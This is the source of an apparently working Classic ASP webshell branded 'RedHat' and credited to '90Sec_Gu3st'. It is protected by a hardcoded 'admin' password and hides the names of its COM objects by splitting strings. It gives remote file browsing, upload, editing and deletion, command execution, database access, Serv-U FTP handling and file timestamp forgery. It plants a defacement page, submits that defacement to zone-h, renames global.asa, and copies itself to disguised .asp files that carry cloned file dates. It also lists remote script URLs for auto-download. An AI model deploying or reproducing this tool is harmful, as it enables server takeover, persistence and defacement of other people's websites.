<%
server.scripttimeout=600
response.buffer=true
Response.Expires=-1
Session.Timeout=600
copyright="90Sec_Gu3st"      '版权
userpass="admin"	     'daMA密码
On Error Resume Next
Const vgo="admin"            'XIAOMA密码
Const mam="want_pre.asp"
Const nkw="RedHat"
Const pxo="RedHat"
Const ydc="RedHat Hacker"    '黑页内容
Const vtn="RedHat.html"      '黑页名称
'<!
const dbx="http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt"
Const ywc=False
Const xim=True
'!>  这里是自动下载的脚本，有需要的替换成自己的
public  br,ygv,gbc,ydo,yka,wzd,sod,vmd
sod=Array("D","7","S","O","q","G","j","l","z","4","L","k","m","x","0","c","v","H","f","3","K","W","U","a","I","A","s","9","8","Q","Y","2","i","M","P","o","R","u","J","Z","5","X","B","V","F","p","N","e","1","T","w","y","b","6","n","t","C","r","h","g","d","E","常","开","器","道","标","要","端","管","种","本","导","量","序","详","编","绝","实","超","机","复","级","视","户","「","逆","停","时","结","件","撤","询","述","认","吗","型","如","无","用","配","∩","网","记","恢","门","操","于","大","其","登","危","确","击","所","筛","界","相","也","设","循","能","名","载","√","置","境","测","地","继","且","；","情","许","保","程","创","成","全","在","码","长","命","后","键","客","列","单","总","据","和","显","构","源","退","栏","录","×","马","账","句","号","果","允","，","息","除","库","卡","扫","知","物","修","磁","员","因","擎","性","合","藏","进","已","式","欢","环","现","功","这","：","约","密","是","迎","二","信","路","改","语","丁","闭","访","隶","手","动","试","险","会","＝","启","项","由","未","脚","不","制","有","为","误","共","始","版","」","空","通","规","加","查","将","属","交","权","局","围","站","建","洞","文","输","范","】","读","回","络","没","更","令","刷","定","限","作","盘","中","期","锁","问","含","≠","索","统","致","高","系","包","容","活","组","永","选","点","被","对","禁","部","行","驱","字","安","　","跨","灾","失","册","根","入","重","格","低","页","理","址","败","移","必","则","补","引","取","放","度","续","服","当","前","难","探","【","临","数","同","漏","检","上","变","看","日","象","描","可","尾","次","符","表","否","指","及","返","解","称","小","关","面","夹","间","过","或","内","隐","注","到","再","默","个","并","法","基","类","位","的","须","毕","各","以","条","示","新","打","值","择","消","口","搜","束","提","桌","目","存","一","传","下","话","添","此","镜","子","务","原","该","删","！","自","径","出","主","执","最","辑","菜","错","请","完","写")
vmd="gzjm51r2NOlL7YWESsdqvhBxaJ4Mu9IAXH8ZGPF6k0U3QfRcDibCyeKonVTtwp称类必能误知种重续配失漏端保永条禁环值扫号再空间没被记对个前结制示藏继门合构刷主难桌显注毕查新请镜更当探补返后功围吗性修驱放象包撤这码话问中下位输否退栏出；恢境】序读上行完根如指常详据≠各管超全理含确√面添允总须尾表检并定败隐册安！日灾大×键消低停打取最统致网录洞户项绝权法件基小址编菜手无除试锁束传磁欢络开部属客选期载述型逆相以数为辑则标于执脚要系许写是且导账加界所提字设高∩看认或搜路器进果临筛同入择删命跨页机该站名作此内点语访密」级地符量二未马描视存组和息引单擎容关共成自通目险时丁其程创＝格复始原服务登移约已口子置闭本：到【员径不活默夹解用信规物会测道交因击可列库操动在度危回由，范局卡令源过实迎询　盘情也版启一有「限现索式建隶错改句文将及的变长次循"
dim zol,fxu,pzk,vrc,cl,qzx,jmc,oej,xbc,oeh,phg,sgb,wnb,jss,iuw,xjy,dvh,qqe,bvn,jgb,flh,ruj,egp,ezc,qjd,bwl,pyz,xcn,lsw,nmc,gia,xnf,ucf,cfk,wgb,tht,xut,yfx,lxr,jgd,dcu,par,jfs,del,djr,T1,mra,bze,amt,xkj,yce,bap,isa,avx,cqm,aon,qsa,qsm,usk,kkw,ogp,rbl,rnz,pdl,rbz,mt,svx,ipi,qgl,ffe,ozf,lbc,gwm,riw,lut,ffg,ugj,bge,bnb,ysl,gdm,xdz,qhi,bdm,kru,pvc,tbr,xss,uzk,dko,ugw,zcu,ruz,oky,rhy,mwf,kxj,gof,waa,mke,wtq,qpv,rdg,toq,eoj,lat,slg
Const fbc="#000000,#111111,#222222,#333333,#444444,#555555,#666666,#777777,#888888,#999999,#AAAAAA,#BBBBBB,#CCCCCC,#FFFFFF,#f44444,#00FF00,#f000001"
Const mwq="oej|sgb|wnb|jss|lsw|xnf|ucf|cfk|wgb|tht|xut|dcu|par|cqm|aon|qsa|qsm|cwb|duh|yvp|ajv"
Const sib="|asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config|"
Const sqv="_"
Const fyf="_request_send_sumbit_include_reel_open_form_month_data"
ydo=0
qzx=oxs("url")
jmc=oxs("local_addr")
oeh=server.mappath(".")
phg=server.mappath("/")
cl=split(fbc,",")
lxr="<hr>"
pzk="<font color='"&cl(15)&"'><b>√</b></font>"
vrc="<font color='"&cl(16)&"'><b>×</b></font>"
bvn="<title>"&nkw&" - "&jmc&" </title><style type='text/css'>body{border:0;margin:0;table-layout:fixed;color:"&cl(13)&";font-size:12px;word-break:break-all;background:"&cl(0)&";SCROLLBAR-face-COLOR:"&cl(4)&";crollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(2)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(5)&";overflow:auto;}tr{background-color:"&cl(2)&";padding:2px;}tr,td{margin-top:5px;color:"&cl(10)&";font-size:12px; border-bottom:1px solid "&cl(0)&";}.radio{background:;}form{margin:0;padding:0;}input,select{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;}img{border:0px;}textarea{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;padding:3px 5px 5px 5px;SCROLLBAR-face-COLOR:"&cl(4)&";scrollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(0)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(4)&";overflow:auto;}h2{margin:0;padding:0;height:20px;line-height:20px;font-size:12px;color:"&cl(13)&";}.menu{background:url(http://ll4best.com/images/radhattop.gif);}.toptb tr{background:;padding:0px;}.toptb td{border:0px;}.toptb h2{color:"&cl(1)&";}h3{background:"&cl(0)&";margin:0;padding:0;height:30px;line-height:30px;font-size:12px;color:"&cl(13)&";}u{text-decoration: none;color:"&cl(7)&";float:left;display:block;width:50%;margin-right:10px;}a{color: "&cl(12)&";text-decoration:none;}a:hover{color: "&cl(14)&";text-decoration:none;}.fixSpan{overflow: hidden;white-space: nowrap;text-overflow: ellipsis;vertical-align: baseline;}.button{overflow:visible;padding:0px;width:0;height=25px;}</style><script>function vrf(str){return str.charCodeAt();}function fvm(jwv){if(jwv==''){return jwv;}else{var tt='';sru='';tmpaci='';for(var i=0;i<jwv.length;i++){sru=jwv.substr(i,1);tmpaci=sru.charCodeAt();if(128>tmpaci>0){sru=tmpaci+27;}tt+=sru+'"&sqv&"';}return tt.substr(0,tt.length-1);}}function yjr(id){return document.getElementById(id);}function wkw(qux){var pamarr;pamarr='"&mwq&"'.split('|');for(var i in pamarr){if(yjr(pamarr[i])&&yjr(pamarr[i]+'1')){yjr(pamarr[i]).value=yjr(pamarr[i]+'1').value;yjr(pamarr[i]).value=fvm(yjr(pamarr[i]).value);}}yjr(qux).submit();}function xtg(qux,nmb){var vala=yjr(qux).sgb;var valb=yjr(qux).folderpath_x;if(nmb==''){vala.value=fvm(valb.value);valb.value='g';}else{vala.value=fvm(nmb);}yjr(qux).submit();}function tas(yiq,cvc){var thetar=yjr('zol').target;if(yiq=='ttf'){yjr('zol').target='_blank';}if(yiq=='db'){yjr('ucf').value=fvm(cvc);yjr('db').submit();}else{yjr('zol').oej.value=fvm(yiq);yjr('zol').wnb.value=fvm(cvc);yjr('zol').submit();yjr('zol').target=thetar;}}</script>"
br=chr(13)&chr(10)
fxu=split("Scri"&kbr&"pting.FileSyste"&qyy&"mObject#WScri"&jjx&"pt.Sh"&tmj&"ell#WScri"&jjx&"pt.Shel"&wxt&"l.1#Shel"&wxt&"l.Applic"&uct&"ation#Shel"&wxt&"l.Applic"&uct&"ation.1#WScri"&jjx&"pt.Network#Shel"&wxt&"l.Users#Ado"&mpe&"db.S"&bag&"tream#Microsoft.X"&qqp&"MLHTTP#MS"&tnd&"XML2.X"&qqp&"MLHTTP#hzhost.modules#Scri"&kbr&"pting.Dictionary#Ado"&mpe&"db.Conn"&bku&"ection#ADOX.Catalog#JRO.JetEngine#Ado"&mpe&"db.Rec"&xng&"ordSet#SoftA"&mps&"rtisans.F"&jyr&"ileUp#LyfUpload.UploadFile#Persi"&rfq&"ts.Upload.1#JMail.SmtpMail#CDONTS.NewMail#SmtpMail.SmtpMail.1","#")
Set objRe=new RegExp
objRe.Global=True
objRe.IgnoreCase=True
objRe.MultiLine=True
sub dih()
Set ozf=khe(fxu(0))
If Not IsObject(ozf) then Set ozf=bne
end sub
sub ays()
Set ffe=khe(fxu(2))
If Not IsObject(ffe) then Set ffe=khe(fxu(1))
If Not IsObject(ffe) then set ffe=omt
If Not IsObject(ffe) then set ffe=dza
end sub
Function khe(ama):Set khe=server.createObject(ama):End Function:function yxd(str,rmo):if str<>"" then str="alert('"&str&"');"
str=replace(str,vbCrLf,""):tng str&iif(rmo=0,"window.location.href=document.referrer;","history.go(-"&rmo&");"):end function:sub zko():Response.Flush:end sub
Function oxs(str):oxs=Request.ServerVariables(str):End Function:Sub j(str):response.write(str):End Sub:Function wle(str,ymw):objRe.Pattern=ymw:wle=objRe.Test(str):End Function
function xqk(str)
xqk=pdq(request(str))
end function
function afo(wpath,efb)
afo=xhp("javascript:xtg(""hf"","""&lyx(wpath)&""")","target='_parent'",efb)
end function
function usx(zbi,tte,dvs)
usx=xhp("javascript:tas("""&zbi&""","""&lyx(tte)&""")","",dvs)
end function
function ibi(oji,fbn,crm)
ibi=xhp("javascript:tas("""&crm&""","""&lyx(oji)&""")","class='am' onclick='javascript:return confirm(""确定删除  "&fbn&""")'","删除")
end function
Function lyx(str)
lyx=Replace(str,"\","\\")
lyx=Replace(lyx,".","\.")
lyx=Replace(lyx,"?","\?")
lyx=Replace(lyx,"+","\+")
lyx=Replace(lyx,"(","\(")
lyx=Replace(lyx,")","\)")
lyx=Replace(lyx,"*","\*")
lyx=Replace(lyx,"[","\[")
lyx=Replace(lyx,"]","\]")
End Function
function nru(s)
if not isnull(s) then
s=replace(s,">","&gt;")
s=replace(s,"<","&lt;")
s=replace(s,chr(39),"&#39;")
s=replace(s,chr(34),"&quot;")
s=replace(s,chr(20),"&nbsp;")
nru=s
end if
end function
function qpe(t):qpe=iif(t="0","<font face=wingdings size=3>0</font> ","<font face=webdings size=4>&#157;</font> ")
dim f_s,f_t,f_w
f_w="webdings"
select case t
case "1"
f_w="wingdings":f_s=3:f_t="1"
case "2"
f_w="wingdings":f_s=3:f_t="&#200;"
case "0","8"
f_w="wingdings":f_s=3:f_t="0"
case "asp","asa","cer","cdx" 
f_s=4:f_t="&#166;"
case "3"
f_w="wingdings":f_s=2:f_t="&#232;"
case "4"
f_w="wingdings":f_s=3:f_t="&#238;"
case "aspx"
f_s=4:f_t="&#157;"
case "jsp"
f_s=4:f_t="&#158;"
case "html","shtml","htm"
f_s=4:f_t="&#155;"
case "jpg","gif","png","bmp"
f_s=4:f_t="&#156;"
case "txt","inc","config"
f_s=4:f_t="&#165;"
case "css"
f_s=4:f_t="&#162"
case "php"
f_s=4:f_t="&#202;"
case "t"
f_s=2:f_t="8"
case "js"
f_w="wingdings":f_s=4:f_t="O"
case "exe","com","bat"
f_w="wingdings":f_s=4:f_t="&#255;"
case "rar","zip","7z"
f_s=4:f_t="&#144;"
case "db","mdb"
f_s=4:f_t="&#168;"
case else
f_s=4:f_t="&#163;"
end select
qpe="<font face="&f_w&" size="&f_s&">"&f_t&"</font> "
end function 
if request("mgh")<>"" then
radname=Request.ServerVariables("Script_Name")
set fs=server.createobject("scr"&"ipt"&"in"&"g.fi"&"les"&"ystemob"&"ject") 
radfile=server.mappath(radname) 
set txt=fs.opentextfile(radfile,1,true) 
for n=1 to 10
if txt.atendofstream then exit for
line=txt.readline
response.write line & "<br>" 
next
end if
function xhp(a,b,c)
xhp="<a href='"&a&"' "&b&">"&c&"</a>"
end function
function qkn(wnb)
if instr(wnb,phg) then
qkn=replace(wnb,phg,"")
qkn=replace(qkn,"\","/")
if left(qkn,1)<>"/" then qkn="/"&qkn
qkn=xhp(qkn,"class='am' target='_blank'","打开")
else
qkn="&nbsp;"
end if
end function
Function fvm(jwv):If jwv=""Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt="":For i=1 To Len(jwv):sru=Mid(jwv,i,1):If Asc(sru)<128 And Asc(sru)>0 Then:tt=tt&Asc(sru)+27&sqv:Else:tt=tt&sru&sqv:End If:Next:fvm=Left(tt,Len(tt)-1):End Function:Function pdq(fom):If fom="" Or Not wle(fom,"^((\d+|.)"&sqv&")+(\d+|.)$") Then:pdq=fom:Exit Function:End If:Dim dd,eok:dd="":eok=Split(fom,sqv):For i=0 To UBound(eok):If IsNumeric(eok(i))Then:dd=dd&Chr(CInt(eok(i))-27):Else:dd=dd&eok(i):End If:Next:pdq=dd:End Function
if session("login")<>UserPass then
response.write "<body style=""background:url(http://ll4best.com/images/radhatbg.jpg) no-repeat center center;""> <center><FONT style=""FONT-SIZE: 80pt; FILTER: shadow(color:#696969,strength=55); WIDTH: 100%;  LINE-HEIGHT: 300%; FONT-FAMILY:Arial"">"&Copyright&"</FONT><div style='width:400px;padding:32px; align=left'><br><form action='"&url&"' method='post'><b>PassWord：</b><input name='pass' type='password' size='22'> <input type='submit' value='submit'></center>"
	if request.form("pass")=UserPass then
	session("login")=UserPass
	response.redirect("?")
	end if
response.end
end if
function bcy()
qnk"hf",qzx,"":njk"sgb","",0:sdj
qjd="zoj"
if xqk("sgb")="" then qjd="psx"
ycf"100%"" height=""100%"" class=""toptb":ihv 4:j"<td height='1' valign='top' class='menu'>":vux:cqb 4:ujq"80c","<h2><font color=red>地址栏：</h2></font>":ujq"'% height='40",fri("sgb1","text|100%",session("sgb")):ujq"80c",fri("^:wkw('hf')","button","GO")& qjr("",iif(xqk("sgb")="",pdq(""),"")):ujq"80",xhp("javascript:tas(""ttf"","""")","title='被黑网站统计一键提交'","<img src='http://ll4best.com/images/zone-h.gif'>"):ity:xzh:ihv 4:ujq"","<iframe name='fileframe' src='?oej="&qjd&"' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>":ity
end function
function xzh()
on Error Resume Next
qnk"zol",qzx,"fileframe":njk"oej","",0:njk"wnb","",0:sdj
vux
cqb 5
ujq"'% height='28'c",afo(phg,b("WEB根目录"))
ujq"c",afo(oeh,b("本程序目录"))
ujq"c",usx("jqw","",b("功能一"))
ujq"c",usx("jeh","",b("功能二"))
ujq"c",usx("iih","",b("数据库操作"))
ujq"c",usx("fva","",b("执行CMD"))
ujq"c",usx("bin","",b("用户进程"))
ujq"c",usx("yoq","",b("Serv"&mro&"-U Ftp"))
ujq"c",usx("mvi","",b("生成小马"))
ujq"c",xhp(qzx,"target=_top",b("欢迎界面"))
ujq"c",usx("logout","",b("退出"))
ity
end function
class llbf:sub class_initialize:dih:end sub:sub class_terminate:set ozf=nothing:end sub
function dpt(c)
On Error Resume Next
if session("dpt")="" then
dim ytj,e
ytj="\Program Files,\Documents and Settings\All Users,\Documents and Settings\All Users\「开始」菜单\程序,\recycler,\wmpub,\WINDOWS,\WINDOWS\Temp,\Program Files\RhinoSoft.com,\Program Files\ServU,\php,\Program Files\Microsoft SQL Server,\docume~1\alluse~1\Application Data\Symantec\pcAnywhere,\Documents and Settings\All Users\桌面,\documents and settings\All Users\Application Data\Microsoft\Media Index"
for each c in ozf.drives
for each a in split(ytj,",")
e=c&a
if ozf.folderexists(e) then dpt=dpt&cmh(0)&mnj("",xhp("javascript:xtg(""hf"","""&lyx(e)&""")","target='_parent' title='"&e&"'","【"&left(e,1)&"】【"&qyl(e,"\")&"】"))
next
next
session("dpt")=dpt
else
dpt=session("dpt")
end if
end function
function ttf()
On Error Resume Next
fab=server.mappath("/")&"\"&vtn
ckz="http://"&oxs("SERVER_NAME")
ozf.CreateTextFile(fab).WriteLine(ydc) 
if err then
err.clear
fab=server.mappath(".")&"\"&vtn
ozf.CreateTextFile(fab).WriteLine(ydc) 
ckz=ckz&ngm(qzx,"/",false)&"/"&vtn
else
ckz=ckz&"/"&vtn
end if
ycf"400"" align=""center"
cqb 4
ujq"","信息提交至："&xhp("http://zone-h.com.cn","_black","http://zone-h.com.cn")&"<br>Hacker："& pxo&"<br>快照："&xhp(ckz,"_black",ckz)
ihv 4
qnk"bh","http://www.zone-h.com.cn/savesubmit.php","o"
njk"user","",pxo
njk"url","",ckz
sdj
ujq"c","<iframe name='o' src='' width='400' height='300'></iframe><br><br><a href=# onclick='javascript:window.close();'>关闭</a><br>"
tng"bh.submit();"
ity
end function
function xpm(m)
On Error Resume Next
for each d in ozf.drives
if m=0 then ihv 1:ujq"",afo(d&"\","磁盘&nbsp;&nbsp;("&d.driveletter&":)")
next
end function
function jfd(iuw,zhi)
jfd=ozf.getparentfoldername(iuw)
if jfd="" then jfd=iuw
gbc=jfd
if zhi="" then zhi="【返回】"
jfd=afo(jfd,dwe(zhi))
end function
function awi(iuw)
qnk"zol",qzx,"filelist":njk"oej","",0:njk"wnb","",0:njk"yvp","",0:sdj
qnk"db",qzx,"_parent":njk"oej","","iih":njk"dah","","tsu":njk"param","","":njk"ucf","","":sdj
iuw=nru(iuw)
set fold=ozf.getfolder(iuw)
if right(iuw,1)<>"\" then iuw=iuw&"\"
vux
for each f in fold.subfolders
jhm=nru(f.name)
ihv 0
ujq 10,qpe(0)
ujq"",afo(iuw&jhm,jhm)
ujq 70,"&nbsp;"
ujq 70,xbd(2,iuw&jhm,f.Attributes)
ujq 160,iif(datediff("d",f.datelastmodified,now())=0,dwe(f.datelastmodified),f.datelastmodified)
ujq 40,"&nbsp;"
ujq 40,"&nbsp;"
ujq 40,usx("lzj",iuw&jhm,"复制")
ujq 40,usx("qqd",iuw&jhm,"移动")
ujq 40,ibi(iuw&jhm,jhm&"&nbsp;及其子目录和文件","oio")
ujq 40,"&nbsp;"
next
for each l in fold.files
cvc=nru(l.name):ynk=cvc
iuy=iuw&cvc
if ngm(cvc,".",false)="index" or ngm(cvc,".",false)="default" then ynk=dwe(ynk)
ihv 1
ujq 10,qpe(LCase(qyl(cvc,".")))
ujq"",usx("yzx",iuy,ynk)
ujq 70,clng(l.size/1024)&"k"
ujq 70,xbd(1,iuy,l.Attributes)
ujq 160,iif(datediff("d",l.datelastmodified,now())=0,dwe(l.datelastmodified),l.datelastmodified)
ujq 40,qkn(iuy)
ujq 40,usx("evu",iuy,"编辑")
ujq 40,usx("kuq",iuy,"复制")
ujq 40,usx("ezp",iuy,"移动")
ujq 40,ibi(iuy,cvc,"wlr")
ujq 40,usx("db",iuy,"数据库")
next
ity
set fold=nothing
end function
function zoj(iuw)
dim ymx,jiw,nok,xlt,iuy,ynk
qnk"hf",qzx,"_parent":njk"sgb","",0:sdj
qnk"zol",qzx,"filelist":njk"oej","",0:njk"wnb","",0:njk"yvp","",0:sdj
ycf"100%"" height=""100%"
cqb 3
j"<td width='200px' align='center' style='border:0;background-color:"&cl(0)&"'><div style='overflow-y:auto;height:100%;'>"
ycf"98%"
xpm 0
ihv 1:ujq"",afo(phg,"站点根目录")
ihv 1:ujq"",afo(oeh,"本程序目录")
j dpt(d)
ity
j"</td><td style='border:0;background-color:"&cl(0)&"'>"
ycf"100%"" height=""100%"
j"<tr style='padding:0px;'><td height='10' style='border-bottom:0px;'>"
vux
cqb 4
vfc
ujq 120,"&nbsp;"&fri("^:tas('kud','')","button","打包当前目录")
czg iuw
ity
j"</td><tr style='padding:0px;'><td>"
ycf"100%"" height=""100%"
cqb 2:ujq"'% colspan='2",b("名称")
ujq 70,b("大小"):ujq 70,b("属性"):ujq 160,b("修改时间"):ujq 40,"&nbsp;":ujq 40,"&nbsp;":ujq 40,"&nbsp;":ujq 40,b("操作"):ujq 40,"&nbsp;":ujq 40,"&nbsp;":ujq 14,"&nbsp;"
ihv 0
ujq"'% colspan='13",qpe(0)&jfd(iuw,"..")
j"<tr style='padding:0px;'>"
ujq"'% height='100%' colspan='13","<iframe name='filelist' id='filelist' src='?oej=awi' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>"
ity
j"</td>"
ity
end function
function vfc()
On Error Resume Next
if yvp<>"" then
ozf.createfolder session("sgb")&yvp
yxd iif(err>0,Err.Description,""),0
else
tng"zol.oej1.value='evu'"
ujq 60,"<h2>"&qpe("t")&"新建:</h2>"
ujq 50,ury("creattype^:zol.oej1.value='evu'",0,"evu",1=1,0)&"文件"
ujq 50,ury("creattype^:zol.oej1.value='vfc'",0,"vfc",1,0)&"目录"
ujq 200,fri("yvp1","text","New")
ujq 10,fri("^:if(zol.oej1.value=='vfc'){zol.target='';}wkw('zol');","button","创建")
end if
end function
function xbd(ty,iuw,num)
hz="-":if num>=32 then hz="A"
select case num
case 0,16,32,2,18,34 xbd="x"
case else xbd="v"
end select
if xbd="v" then
xbd=xhp("javascript:tas(""ydr"",""v"&ty&"@"&lyx(iuw)&""")","class='am' title='解锁'","属性")&"<font face='webdings' size='1' color="&cl(16)&">x</font>"&num
else
xbd=xhp("javascript:tas(""ydr"",""x"&ty&"@"&lyx(iuw)&""")","class='am' title='加锁'","属性")&"√"&num
end if
end function
function oio(iuw) 
On Error Resume Next
if ozf.folderexists(iuw) then
ozf.deletefolder iuw
yxd Err.Description,iif(err,2,0)
end if
end function
function wlr(iuw)
On Error Resume Next
if ozf.fileexists(iuw) then
ozf.GetFile(iuw).attributes=0
ozf.deletefile iuw
yxd Err.Description,iif(err,2,0)
end if
end function
Function yzx(iuw)
Response.Clear
dim jby
Set jby=khe(fxu(7))
jby.Open
jby.Type=1
jby.LoadFromFile iuw
sz=InstrRev(iuw,"\")+1
Response.AddHeader "Content-Disposition","attachment; filename="&Mid(iuw,sz)
Response.AddHeader "Content-Length",jby.Size
Response.CodePage=65001
Response.ContentType="application/octet-stream"
Response.BinaryWrite jby.Read
zko
jby.Close
Set jby=Nothing
End Function
function czg(iuw)
on Error Resume Next
dim tpo,yvg,ixs,yis,loe,cwp
if request("gia")<>"post" then
qnk"upl",qzx&"?oej=czg&gia=post"" enctype=""multipart/form-data",""
if session("ufi")<>"" then
ujq"c",iif(qkn(session("ufi"))="&nbsp;",session("ufi"),b(replace(qkn(session("ufi")),"打开",session("ufi"))))&"&nbsp;&nbsp;"&afo(session("sgb"),dwe("【返回】"))'xhp("javascript:history.go(-2);location.reload();","",dwe("【返回】"))
else
ujq 60,"<h2>"&qpe("t")&"上传:</h2>"
ujq"",fri("bd1f^;re1n.value=this.value.split('\\')[this.value.split('\\').length-1]","file|100%",0)&fri("os1p","",replace(session("sgb"),"\\","\"))
ujq 160,fri("re1n","text","重命名")
ujq"40",fri("^:wkw('upl')","button","上传")
end if
sdj
session("ufi")=""
else
Set u=new UUPC
Set f=U.UA("bd1f")
fsr=replace(session("sgb")&U.form("re1n"),"\\","\")
If fsr="" Or f.qoi=0 then
yxd"请输入上传的完全路径后选择一个文件上传!",0
Else
f.tbp fsr
If Err.number=0 Then
session("ufi")=fsr
yxd"",0
else
tng"alert('上传失败\n错误原因："&Err.Description&"\n检查是否有写权限!');window.history.go(-1);"
end if
End If
set f=nothing
set u=nothing
end if
end function
function sxk(fjl,iuw)
On Error Resume Next
err.clear
Set jgd=khe(fxu(3))
If Not IsObject(jgd)Then Set jgd=khe(fxu(4))
if fjl<>"" And IsDate(fjl) then jgd.NameSpace(ngm(iuw,"\",False)).ParseName(qyl(iuw,"\")).ModIfyDate=fjl
set jgd=nothing
if err.number=0 then
sxk="文件最后修改时间为："&fjl
else
sxk="修改时间失败"
end if
end function
function jzd(iuw,w)
On Error Resume Next
if w<>"" then ozf.GetFile(iuw).attributes=w
jzd=ozf.GetFile(iuw).attributes
err.clear
end function
function evu(iuw)
iuw=wnb
if iuw="" then iuw=yvp:gia="new"
dim jze
if mqt="" then mqt="gb2312"
if gia="post" then
set t=khe(fxu(7))
With t
.Type=2
.mode=3 
.open 
.charset=mqt
.WriteText kjz
.SaveToFile iuw,2 
.Close 
End With
set t=nothing
bdm=bdm
if filesafe="1" then bdm=7
if bdm="" then bdm=32
if clng(jzd(iuw,bdm))<>clng(bdm) then jze=dwe("修改文件属性失败 ")
j"<center>"
p:p:p
j"文件保存成功！"&jze&"文件当前属性为："&jzd(iuw,"")
p:p:j sxk(lastmodified,iuw)
p:p:j replace(qkn(iuw),"打开",dwe("【打开】"))&xhp("javascript:history.go(-1);","",dwe("【返回】"))&jfd(iuw,"【刷新】")
j"</center>"
response.end
end if
if iuw<>"" then
if mid(iuw,2,1)<>":" then iuw=session("sgb")&iuw
if ozf.fileexists(iuw) then
bdm=jzd(iuw,"")
jzd iuw,0
set t=khe(fxu(7))
With t
.Type=2
.mode=3 
.open
.charset=mqt
.loadfromfile iuw
txt=Replace(.ReadText(),Chr(0)," ")
.Close 
End With
set t=nothing 
end if
end if
if gia="new" then
ngn"新建文件"
txt=kjz
else
ngn"编辑文件"
end if
vux
cqb 3
j"<td valign='top' align='center'>"
njk"wnb1","text",iuw
qnk"tttf",qzx,""
njk"gia","",gia
njk"oej","","evu"
njk"bdm","",bdm
njk"wnb","",iuw
j"<textarea name='kjz' style='width:100%;' rows='25'>"&txt&"</textarea><br>"
j"<hr>"
j"加锁："
ury"filesafe",1,1,1,1
j" 修改日期:"
kru=now()
if ozf.fileexists(iuw) then kru=ozf.getfile(iuw).datelastmodified
njk"lastmodified","text|150",kru:j"&nbsp;&nbsp;&nbsp;"
njk"goback^:history.back()","button","返回":j"&nbsp;&nbsp;&nbsp;"
njk"reset","reset","重置":j"&nbsp;&nbsp;&nbsp;"
njk"^:gia.value='post';wkw('tttf')","button","保存":j"&nbsp;&nbsp;&nbsp;"
ury"mqt^:wkw('tttf')",0,"gb2312",mqt="gb2312",1
j"gb2312"
ury"mqt^:wkw('tttf')",0,"utf-8",mqt="utf-8",1
j"utf-8"
sdj
j"</td></tr></table>"
end function
function kcm()
On Error Resume Next
if xim=false then exit function
adh=server.mappath("/")&"\global.asa"
fnc=server.mappath("/")&"\"&ozf.GetTempName&".global.bak"
if ozf.fileexists(adh) then
vlc="存在GLOBAL.ASA,"
ozf.GetFile(adh).attributes=0
if err<>0 then vlc=vlc&"修改文件属性失败":err.clear
ozf.movefile adh,fnc
vlc=vlc&"删除并备份"&iif(err=0,"成功&nbsp;"&lyx(fnc),"失败")
else
exit function
end if
kcm=vlc
end function
function zbw(wnb,wqw)
dim mml,vgz,gkx
mml=iif(wqw mod 2=0,"移动","复制"):vgz="文件"&iif(wqw>2,"夹","")
ngn mml&vgz
if jss="" then
div "将"&mml&" "&yez(wnb)&" "&vgz&"到",3
vux:ihv 3
ujq"",fri("wnb1","",wnb)&fri("jss1","text",wnb)
qnk"ff","",""
njk"oej","","zbw"
njk"gia","","post"
njk"wnb","",0
njk"jss","",0
njk"wqw","",wqw
ujq 10,fri("^:wkw('ff')","button",mml)
ujq 10,fri("^:history.go(-1)","button","返回")
sdj
ity
else
select case wqw
case 1
ozf.copyfile wnb,jss
case 2
ozf.movefile wnb,jss
case 3
ozf.copyfolder wnb,jss
case 4
ozf.movefolder wnb,jss
end select
j"<center><br><br><br>"&vgz&" "&wnb&" 成功"&mml&"到 "&jss&xhp("javascript:history.go(-2);","",dwe("【返回】"))&jfd(jss,"【刷新】")&"</center>"
end if
end function
function ydr(iuw)
dim aqt,won
aqt=left(split(iuw,"@")(0),1)
won=right(split(iuw,"@")(0),1)
iuw=split(iuw,"@")(1)
if won=1 then Set pah=ozf.GetFile(iuw)
if won=2 then Set pah=ozf.GetFolder(iuw)
if aqt="v" then
pah.Attributes=32/won
else
pah.Attributes=7
end if
Set pah=Nothing
tng("location.href=document.referrer;")
end function
function mvi()
On Error Resume Next
iuw=oxs("PATH_TRANSLATED")
qhi=split(fyf,"_")
n=0
ffg=wjl(phg)
set f=ozf.OpenTextFile(iuw,1)
pjm=f.readall
set f=nothing
objre.Pattern=">!"&"'[\s\S]*?!"&"<'"
pjm=objre.replace(pjm,"")
objre.Pattern="'<"&"![\s\S]*?'!"&">"
pjm=objre.replace(pjm,"")
objre.Pattern="<obj"&"ect runat[\s\S]*?"&vbCrLf
pjm=objre.replace(pjm,"")
randomize
m=int((ydo)*rnd+1)
l=int((ubound(qhi))*rnd+1)
for each x in ozf.getfolder(ffg).files
if right(x.name,4)=".asp" then
n=n+1
if n=m then
bge=x.name
bdm=x.attributes
kru=x.datelastmodified
end if
end if
next
objre.Pattern=mam&".+?"&vbCrLf
pjm=objre.replace(pjm,bge&chr(34)&vbCrLf)
pjm=replace(pjm,"yka","uug")
pvc=iif(instr(bge,"_")>0,"_",".")
bge=ngm(bge,pvc,False)&iif(pvc="_",pvc,"")&qhi(l)&".asp"
bge=ffg&bge
set f=ozf.OpenTextFile(bge,2,true)
f.write(pjm)
set f=nothing
jzd bge,bdm
sxk kru,bge
qep=replace(bge,phg,"")
if left(qep,1)<>"\" then qep="/"&replace(qep,"\","/")
qnk"zol",qzx,"fileframe":njk"oej","",0:njk"wnb","",0:njk"gda","",qep&"?"&vgo:sdj
j"<center>"&usx("iij",iuw,"跳转并删除")
j"<br>"&usx("iij","","跳转")&"</center>"
Response.end
end function
function iij()
On Error Resume Next
session.Abandon()
if wnb<>"" then ozf.GetFile(wnb).attributes=0:ozf.deletefile wnb
qnk"n",gda,"_parent":sdj:tng"n.submit()"
end function
function wjl(iuw)
On Error Resume Next
zko
dim atd
if right(iuw,1)<>"\" then iuw=iuw&"\"
set F=ozf.getfolder(iuw)
for each x in f.Subfolders
wjl iuw&x.name
next
set f=nothing
